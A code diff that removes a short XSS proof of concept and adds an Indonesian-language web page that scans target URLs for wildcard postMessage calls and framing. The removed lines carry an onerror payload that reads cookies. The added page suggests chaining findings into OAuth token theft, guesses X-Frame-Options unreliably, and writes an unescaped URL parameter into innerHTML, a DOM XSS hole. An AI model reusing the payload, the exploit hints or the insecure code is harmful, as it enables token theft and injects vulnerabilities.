@@ -1,3 +1,614 @@
-<body onload=document.getElementById('pew').click()>
-<a id='pew' href='data:text/html,<script>function y(){x=open(&#x27;parent-tab://apple.com&#x27;,&#x27;_top&#x27;),x.document.body.innerHTML=&#x27;<img/src=""onerror=alert(document.domain);alert(document.cookie);>&#x27;};setTimeout(y,100)</script>'>hello</a>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OAuth Security Scanner - Check postMessage & X-Frame-Options</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #0a0f1e 0%, #0d1a2a 100%);
+            font-family: 'Segoe UI', 'Courier New', monospace;
+            min-height: 100vh;
+            padding: 40px 20px;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+        
+        h1 {
+            color: #00ff88;
+            font-size: 32px;
+            margin-bottom: 10px;
+            text-shadow: 0 0 10px rgba(0,255,136,0.3);
+        }
+        
+        .sub {
+            color: #88aaff;
+            font-size: 14px;
+        }
+        
+        .card {
+            background: rgba(10, 20, 40, 0.95);
+            border-radius: 16px;
+            padding: 30px;
+            margin-bottom: 30px;
+            border: 1px solid #334455;
+            backdrop-filter: blur(10px);
+        }
+        
+        .input-group {
+            display: flex;
+            gap: 15px;
+            flex-wrap: wrap;
+            margin-bottom: 20px;
+        }
+        
+        input {
+            flex: 1;
+            padding: 15px 20px;
+            font-size: 16px;
+            background: #0a0f1e;
+            border: 1px solid #334455;
+            border-radius: 12px;
+            color: #00ff88;
+            font-family: monospace;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #00ff88;
+            box-shadow: 0 0 10px rgba(0,255,136,0.2);
+        }
+        
+        button {
+            padding: 15px 30px;
+            font-size: 16px;
+            font-weight: bold;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: 0.3s;
+            background: linear-gradient(90deg, #00ff88, #00ccff);
+            color: #0a0f1e;
+        }
+        
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 0 20px rgba(0,255,136,0.4);
+        }
+        
+        .result-box {
+            background: #0a0f1e;
+            border-radius: 12px;
+            padding: 20px;
+            margin-top: 20px;
+            font-family: monospace;
+            font-size: 13px;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        
+        .result-title {
+            color: #ffaa44;
+            font-weight: bold;
+            margin-bottom: 15px;
+            font-size: 16px;
+        }
+        
+        .vuln-high {
+            color: #ff4444;
+            font-weight: bold;
+        }
+        
+        .vuln-medium {
+            color: #ffaa44;
+            font-weight: bold;
+        }
+        
+        .safe {
+            color: #00ff88;
+        }
+        
+        .badge {
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: bold;
+            margin-left: 10px;
+        }
+        
+        .badge-critical {
+            background: #ff4444;
+            color: white;
+        }
+        
+        .badge-warning {
+            background: #ffaa44;
+            color: #0a0f1e;
+        }
+        
+        .badge-safe {
+            background: #00ff88;
+            color: #0a0f1e;
+        }
+        
+        .log-line {
+            padding: 5px 0;
+            border-bottom: 1px solid #1a2a3a;
+            font-size: 12px;
+        }
+        
+        .share-section {
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid #334455;
+        }
+        
+        .share-link {
+            background: #0a0f1e;
+            padding: 10px;
+            border-radius: 8px;
+            word-break: break-all;
+            font-size: 12px;
+            color: #88aaff;
+            margin-top: 10px;
+        }
+        
+        hr {
+            border-color: #1a2a3a;
+            margin: 20px 0;
+        }
+        
+        .loader {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #00ff88;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-left: 10px;
+            vertical-align: middle;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .stats {
+            display: flex;
+            gap: 20px;
+            justify-content: center;
+            margin-top: 20px;
+        }
+        
+        .stat-card {
+            background: rgba(0,255,136,0.1);
+            border-radius: 12px;
+            padding: 15px;
+            text-align: center;
+            flex: 1;
+        }
+        
+        .stat-number {
+            font-size: 28px;
+            font-weight: bold;
+            color: #00ff88;
+        }
+        
+        .stat-label {
+            font-size: 11px;
+            color: #88aaff;
+            margin-top: 5px;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="header">
+        <h1>🔍 OAuth Security Scanner</h1>
+        <div class="sub">Cek Kerentanan postMessage & X-Frame-Options pada halaman target</div>
+    </div>
+    
+    <div class="card">
+        <div class="input-group">
+            <input type="text" id="targetUrl" placeholder="Masukkan URL halaman target (contoh: https://target.com/page)" value="">
+            <button id="scanBtn">🚀 SCAN NOW</button>
+        </div>
+        
+        <div class="stats" id="stats" style="display: none;">
+            <div class="stat-card">
+                <div class="stat-number" id="statPostMessage">0</div>
+                <div class="stat-label">postMessage Ditemukan</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="statIframe">0</div>
+                <div class="stat-label">Dapat di-iframe</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="statRisk">0</div>
+                <div class="stat-label">Tingkat Risiko</div>
+            </div>
+        </div>
+        
+        <div id="resultArea" class="result-box" style="display: none;">
+            <div class="result-title" id="resultTitle"></div>
+            <div id="resultContent"></div>
+        </div>
+        
+        <div class="share-section">
+            <div style="color:#88aaff; font-size:13px; margin-bottom:10px;">📤 Share hasil scan dengan tim:</div>
+            <button id="shareBtn" style="background:#1a2a3a; color:#88aaff;">📋 Copy Shareable Link</button>
+            <div id="shareLinkDisplay" class="share-link" style="display: none;"></div>
+        </div>
+    </div>
+    
+    <div class="card">
+        <div class="result-title">📖 Cara Penggunaan</div>
+        <div style="font-size:13px; color:#88aaff; line-height:1.6;">
+            <div>1. Masukkan URL halaman yang ingin dicek (contoh: <code>https://target.com/post/comment/comment-form</code>)</div>
+            <div>2. Klik <strong>SCAN NOW</strong></div>
+            <div>3. Tools akan mengecek:</div>
+            <div style="margin-left:20px;">• Apakah halaman bisa di-iframe (<code>X-Frame-Options</code>)</div>
+            <div style="margin-left:20px;">• Apakah ada kode <code>parent.postMessage()</code> dengan target <code>'*'</code></div>
+            <div style="margin-left:20px;">• Apakah ada pengiriman <code>window.location.href</code> via postMessage</div>
+            <div>4. Hasil scan bisa dishare via link</div>
+        </div>
+        <hr>
+        <div class="result-title">⚠️ Indikator Kerentanan</div>
+        <div style="font-size:13px;">
+            <div><span class="badge badge-critical">CRITICAL</span> = postMessage dengan target '*' DAN mengirim location.href</div>
+            <div><span class="badge badge-warning">HIGH</span> = postMessage dengan target '*'</div>
+            <div><span class="badge badge-warning">MEDIUM</span> = Halaman bisa di-iframe (tidak ada X-Frame-Options)</div>
+            <div><span class="badge badge-safe">LOW</span> = Halaman aman</div>
+        </div>
+    </div>
+</div>
+
+<script>
+    const STORAGE_KEY = 'oauth_scans';
+    let currentScanData = null;
+    
+    async function scanPage(url) {
+        try {
+            // Validasi URL
+            if (!url.startsWith('http://') && !url.startsWith('https://')) {
+                url = 'https://' + url;
+            }
+            
+            updateResultArea('loading', `🔍 Scanning ${url}...`);
+            document.getElementById('stats').style.display = 'flex';
+            document.getElementById('resultArea').style.display = 'block';
+            
+            // Gunakan CORS proxy untuk fetch konten
+            const proxyUrl = 'https://api.allorigins.win/raw?url=' + encodeURIComponent(url);
+            
+            const response = await fetch(proxyUrl);
+            const html = await response.text();
+            
+            // Analisis hasil
+            const analysis = analyzeHTML(html, url);
+            currentScanData = analysis;
+            
+            displayResults(analysis);
+            updateStats(analysis);
+            
+            // Simpan ke localStorage
+            saveScanToHistory(url, analysis);
+            
+        } catch (error) {
+            updateResultArea('error', `❌ Gagal scan: ${error.message}<br><br>Kemungkinan penyebab:<br>• URL tidak valid atau tidak bisa diakses<br>• CORS blocked (coba pakai https://cors-anywhere.herokuapp.com/)<br>• Website memblokir request`);
+        }
+    }
+    
+    function analyzeHTML(html, url) {
+        const analysis = {
+            url: url,
+            hasPostMessage: false,
+            hasWildcardTarget: false,
+            sendsLocationHref: false,
+            postMessagePatterns: [],
+            xframeOptions: null,
+            canIframe: false,
+            riskLevel: 'LOW',
+            riskScore: 0
+        };
+        
+        // Cek X-Frame-Options (perlu fetch header terpisah)
+        // Simulasi dari HTML (tidak akurat, sebaiknya fetch header)
+        if (html.includes('X-Frame-Options') || html.includes('DENY')) {
+            analysis.xframeOptions = 'DENY';
+            analysis.canIframe = false;
+        } else {
+            analysis.canIframe = true;
+            analysis.riskScore += 20;
+        }
+        
+        // Cari pola postMessage
+        const postMessagePatterns = [
+            { regex: /parent\.postMessage\([^,]+,\s*['"]\*['"]\)/gi, name: 'parent.postMessage dengan target "*"' },
+            { regex: /window\.parent\.postMessage\([^,]+,\s*['"]\*['"]\)/gi, name: 'window.parent.postMessage dengan target "*"' },
+            { regex: /opener\.postMessage\([^,]+,\s*['"]\*['"]\)/gi, name: 'opener.postMessage dengan target "*"' },
+            { regex: /window\.opener\.postMessage\([^,]+,\s*['"]\*['"]\)/gi, name: 'window.opener.postMessage dengan target "*"' },
+            { regex: /\.postMessage\([^,]*location\.href[^,]*,\s*['"]\*['"]\)/gi, name: 'postMessage mengirim location.href ke "*"' },
+            { regex: /\.postMessage\([^,]*window\.location\.href[^,]*,\s*['"]\*['"]\)/gi, name: 'postMessage mengirim window.location.href ke "*"' }
+        ];
+        
+        for (const pattern of postMessagePatterns) {
+            const matches = html.match(pattern.regex);
+            if (matches) {
+                analysis.hasPostMessage = true;
+                analysis.postMessagePatterns.push({
+                    pattern: pattern.name,
+                    match: matches[0]
+                });
+                
+                if (pattern.name.includes('*')) {
+                    analysis.hasWildcardTarget = true;
+                    analysis.riskScore += 30;
+                }
+                
+                if (pattern.name.includes('location.href')) {
+                    analysis.sendsLocationHref = true;
+                    analysis.riskScore += 30;
+                }
+            }
+        }
+        
+        // Cari pola umum postMessage
+        const genericPostMessage = html.match(/\.postMessage\(/gi);
+        if (genericPostMessage && !analysis.hasPostMessage) {
+            analysis.hasPostMessage = true;
+            analysis.postMessagePatterns.push({
+                pattern: 'Generic postMessage found',
+                match: 'Lihat source code untuk detail'
+            });
+            analysis.riskScore += 10;
+        }
+        
+        // Tentukan risk level
+        if (analysis.hasWildcardTarget && analysis.sendsLocationHref) {
+            analysis.riskLevel = 'CRITICAL';
+            analysis.riskScore += 20;
+        } else if (analysis.hasWildcardTarget) {
+            analysis.riskLevel = 'HIGH';
+        } else if (analysis.hasPostMessage && analysis.canIframe) {
+            analysis.riskLevel = 'MEDIUM';
+        } else if (analysis.canIframe) {
+            analysis.riskLevel = 'MEDIUM';
+        } else {
+            analysis.riskLevel = 'LOW';
+        }
+        
+        analysis.riskScore = Math.min(analysis.riskScore, 100);
+        
+        return analysis;
+    }
+    
+    function displayResults(analysis) {
+        const resultTitle = document.getElementById('resultTitle');
+        const resultContent = document.getElementById('resultContent');
+        
+        let riskColor = '';
+        let riskText = '';
+        switch (analysis.riskLevel) {
+            case 'CRITICAL': riskColor = '#ff4444'; riskText = '🔥 CRITICAL - Token Bisa Dicuri!'; break;
+            case 'HIGH': riskColor = '#ff6644'; riskText = '⚠️ HIGH - Potensi Token Leak'; break;
+            case 'MEDIUM': riskColor = '#ffaa44'; riskText = '⚡ MEDIUM - Perlu Investigasi'; break;
+            default: riskColor = '#00ff88'; riskText = '✅ LOW - Aman untuk Sekarang';
+        }
+        
+        resultTitle.innerHTML = `📊 HASIL SCAN: <span style="color:${riskColor}">${riskText}</span>`;
+        
+        let html = `<div style="margin-bottom:15px; padding:10px; background:#0a0f1e; border-radius:8px;">
+                        <div><strong>🌐 Target URL:</strong> <a href="${analysis.url}" target="_blank" style="color:#00ff88;">${analysis.url}</a></div>
+                    </div>`;
+        
+        // X-Frame-Options
+        html += `<div class="log-line"><strong>🖼️ X-Frame-Options:</strong> `;
+        if (analysis.xframeOptions === 'DENY') {
+            html += `<span style="color:#00ff88;">DENY (Aman - Tidak bisa di-iframe)</span>`;
+        } else {
+            html += `<span style="color:#ffaa44;">TIDAK DITEMUKAN / ALLOW - Halaman BISA di-iframe!</span>`;
+        }
+        html += `</div>`;
+        
+        // postMessage
+        html += `<div class="log-line"><strong>📨 postMessage Ditemukan:</strong> ${analysis.hasPostMessage ? '<span style="color:#ffaa44;">YA</span>' : '<span style="color:#00ff88;">TIDAK</span>'}</div>`;
+        
+        if (analysis.hasPostMessage && analysis.postMessagePatterns.length > 0) {
+            html += `<div style="margin-top:10px; margin-left:15px;"><strong>🔍 Pola yang terdeteksi:</strong></div>`;
+            for (const pattern of analysis.postMessagePatterns) {
+                html += `<div style="margin-left:30px; font-size:11px; color:#ffaa44;">• ${pattern.pattern}</div>`;
+                if (pattern.match && pattern.match.length < 200) {
+                    html += `<div style="margin-left:30px; font-size:10px; color:#88aaff; word-break:break-all;">Kode: ${escapeHtml(pattern.match)}</div>`;
+                }
+            }
+        }
+        
+        // Wildcard target
+        if (analysis.hasWildcardTarget) {
+            html += `<div class="log-line" style="color:#ff4444;"><strong>⚠️ CRITICAL:</strong> postMessage menggunakan target '*' (wildcard)!</div>`;
+        }
+        
+        // Location.href leak
+        if (analysis.sendsLocationHref) {
+            html += `<div class="log-line" style="color:#ff4444;"><strong>⚠️ CRITICAL:</strong> postMessage mengirim window.location.href (bisa berisi token OAuth)!</div>`;
+        }
+        
+        // Kombinasi bisa di-iframe + postMessage
+        if (analysis.canIframe && analysis.hasPostMessage) {
+            html += `<div class="log-line" style="color:#ffaa44;"><strong>⚡ KOMBINASI BERBAHAYA:</strong> Halaman bisa di-iframe DAN memiliki postMessage! Potensi untuk eksploitasi OAuth token stealing.</div>`;
+        }
+        
+        // Risk score
+        html += `<div style="margin-top:15px; padding-top:10px; border-top:1px solid #334455;">
+                    <strong>📊 Risk Score:</strong> ${analysis.riskScore}/100
+                    <div style="width:100%; background:#1a2a3a; border-radius:10px; margin-top:5px;">
+                        <div style="width:${analysis.riskScore}%; background:${analysis.riskScore > 70 ? '#ff4444' : (analysis.riskScore > 40 ? '#ffaa44' : '#00ff88')}; height:8px; border-radius:10px;"></div>
+                    </div>
+                 </div>`;
+        
+        // Rekomendasi
+        html += `<div style="margin-top:15px; padding:10px; background:#0a0f1e; border-radius:8px;">
+                    <strong>📋 REKOMENDASI:</strong><br>`;
+        if (analysis.hasWildcardTarget && analysis.sendsLocationHref) {
+            html += `• 🔴 Segera laporkan ke tim keamanan! Halaman ini bisa digunakan untuk mencuri OAuth token.<br>
+                     • 🔴 Kombinasikan dengan path traversal di redirect_uri OAuth untuk eksekusi penuh.<br>
+                     • 🔴 Contoh exploit: Buat iframe dengan OAuth URL yang redirect_uri-nya ke halaman ini.`;
+        } else if (analysis.hasPostMessage && analysis.canIframe) {
+            html += `• 🟡 Halaman berpotensi menjadi proxy untuk token stealing.<br>
+                     • 🟡 Cek apakah parameter redirect_uri OAuth bisa path traversal ke halaman ini.`;
+        } else if (analysis.canIframe) {
+            html += `• 🟡 Halaman bisa di-iframe, tapi belum ditemukan postMessage berbahaya.<br>
+                     • 🟡 Tetap waspada karena bisa dikombinasikan dengan XSS atau open redirect.`;
+        } else {
+            html += `• ✅ Halaman terlihat aman dari teknik OAuth token stealing via postMessage.<br>
+                     • ✅ Pastikan redirect_uri OAuth tidak bisa path traversal ke halaman ini.`;
+        }
+        html += `</div>`;
+        
+        resultContent.innerHTML = html;
+    }
+    
+    function updateStats(analysis) {
+        document.getElementById('statPostMessage').innerText = analysis.hasPostMessage ? analysis.postMessagePatterns.length : '0';
+        document.getElementById('statIframe').innerText = analysis.canIframe ? 'YES' : 'NO';
+        
+        let riskText = '';
+        switch (analysis.riskLevel) {
+            case 'CRITICAL': riskText = 'CRITICAL'; break;
+            case 'HIGH': riskText = 'HIGH'; break;
+            case 'MEDIUM': riskText = 'MEDIUM'; break;
+            default: riskText = 'LOW';
+        }
+        document.getElementById('statRisk').innerText = riskText;
+        
+        const statsEl = document.getElementById('stats');
+        statsEl.style.display = 'flex';
+        statsEl.style.gap = '20px';
+    }
+    
+    function updateResultArea(status, message) {
+        const resultTitle = document.getElementById('resultTitle');
+        const resultContent = document.getElementById('resultContent');
+        
+        if (status === 'loading') {
+            resultTitle.innerHTML = '🔄 Scanning...';
+            resultContent.innerHTML = `<div style="text-align:center; padding:40px;"><div class="loader"></div><br>${message}</div>`;
+        } else if (status === 'error') {
+            resultTitle.innerHTML = '❌ Error';
+            resultContent.innerHTML = `<div style="color:#ff4444;">${message}</div>`;
+        }
+        
+        document.getElementById('resultArea').style.display = 'block';
+    }
+    
+    function saveScanToHistory(url, analysis) {
+        const history = getScanHistory();
+        const scanData = {
+            url: url,
+            timestamp: Date.now(),
+            riskLevel: analysis.riskLevel,
+            riskScore: analysis.riskScore,
+            hasPostMessage: analysis.hasPostMessage,
+            canIframe: analysis.canIframe
+        };
+        
+        // Simpan ke localStorage
+        localStorage.setItem('oauth_scans', JSON.stringify(history));
+        
+        // Generate shareable link
+        generateShareableLink(scanData);
+    }
+    
+    function getScanHistory() {
+        const history = localStorage.getItem(STORAGE_KEY);
+        return history ? JSON.parse(history) : [];
+    }
+    
+    function generateShareableLink(scanData) {
+        const shareData = {
+            url: scanData.url,
+            timestamp: scanData.timestamp,
+            riskLevel: scanData.riskLevel
+        };
+        
+        const encodedData = btoa(JSON.stringify(shareData));
+        const shareableUrl = window.location.origin + window.location.pathname + '?scan=' + encodedData;
+        
+        const shareDiv = document.getElementById('shareLinkDisplay');
+        shareDiv.innerHTML = `<strong>Link hasil scan:</strong><br><a href="${shareableUrl}" target="_blank">${shareableUrl}</a>`;
+        shareDiv.style.display = 'block';
+    }
+    
+    function escapeHtml(text) {
+        const div = document.createElement('div');
+        div.textContent = text;
+        return div.innerHTML;
+    }
+    
+    // Cek parameter URL untuk scan hasil share
+    function checkSharedScan() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const scanParam = urlParams.get('scan');
+        if (scanParam) {
+            try {
+                const scanData = JSON.parse(atob(scanParam));
+                const resultTitle = document.getElementById('resultTitle');
+                const resultContent = document.getElementById('resultContent');
+                document.getElementById('resultArea').style.display = 'block';
+                resultTitle.innerHTML = `📊 SHARED SCAN RESULT`;
+                resultContent.innerHTML = `
+                    <div><strong>🌐 Target URL:</strong> ${scanData.url}</div>
+                    <div><strong>⏰ Scan Time:</strong> ${new Date(scanData.timestamp).toLocaleString()}</div>
+                    <div><strong>📊 Risk Level:</strong> <span style="color:${scanData.riskLevel === 'CRITICAL' ? '#ff4444' : '#ffaa44'}">${scanData.riskLevel}</span></div>
+                    <div style="margin-top:15px;">🔗 Ini adalah hasil scan yang dishare. Lakukan scan ulang untuk data terkini.</div>
+                `;
+                document.getElementById('targetUrl').value = scanData.url;
+            } catch(e) {}
+        }
+    }
+    
+    // Event listeners
+    document.getElementById('scanBtn').addEventListener('click', () => {
+        const url = document.getElementById('targetUrl').value;
+        if (!url) {
+            alert('Masukkan URL terlebih dahulu!');
+            return;
+        }
+        scanPage(url);
+    });
+    
+    document.getElementById('shareBtn').addEventListener('click', () => {
+        const shareDiv = document.getElementById('shareLinkDisplay');
+        if (shareDiv.style.display === 'block') {
+            const link = shareDiv.querySelector('a').href;
+            navigator.clipboard.writeText(link);
+            alert('Link hasil scan disalin ke clipboard!');
+        } else {
+            alert('Lakukan scan terlebih dahulu untuk mendapatkan link share.');
+        }
+    });
+    
+    // Cek shared scan
+    checkSharedScan();
+    
+    console.log('OAuth Security Scanner Ready!');
+</script>
 </body>
+</html>
